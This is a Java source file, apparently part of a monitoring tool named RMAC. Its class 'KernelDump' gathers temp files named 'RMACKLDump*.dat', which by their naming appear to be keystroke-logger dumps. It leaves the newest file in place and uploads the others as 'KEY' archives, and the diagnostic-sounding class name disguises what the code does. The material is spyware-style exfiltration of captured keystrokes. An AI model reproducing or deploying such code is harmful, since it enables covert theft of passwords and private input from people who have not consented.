package com.rmac.core;

import com.rmac.RMAC;
import com.rmac.utils.ArchiveFileType;
import com.rmac.utils.Constants;
import java.io.File;
import java.io.IOException;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.stream.Stream;
import lombok.extern.slf4j.Slf4j;

@Slf4j
public class KernelDump implements Runnable {

  public Thread thread;

  public KernelDump() {
    thread = new Thread(this, "KernelDump");
    thread.start();
  }

  @Override
  public void run() {
    List<Path> dumps = getAllLogFiles(Constants.SYS_TEMP_LOCATION);
    dumps.forEach(
        dump -> RMAC.uploader.uploadFile(dump.toAbsolutePath().toString(), ArchiveFileType.KEY));
  }

  private List<Path> getAllLogFiles(String dirPath) {
    List<Path> dumps = new ArrayList<>();

    try {
      Path[] logFiles = RMAC.fs.list(dirPath).filter(path -> path.getFileName().endsWith(".dat")
          && path.getFileName().startsWith("RMACKLDump")).toArray(Path[]::new);

      long newestModified = Long.MIN_VALUE;
      Path newestFile = null;
      for (Path f : logFiles) {
        long time = RMAC.fs.getLastModified(f.toAbsolutePath().toString());
        if (time > newestModified) {
          newestModified = time;
          newestFile = f;
        }
      }

      for (Path f : logFiles) {
        if (f != newestFile) {
          dumps.add(f);
        }
      }
    } catch (IOException e) {
      log.error("Could not get RMAC kernel dumps", e);
    }

    return dumps;
  }
}
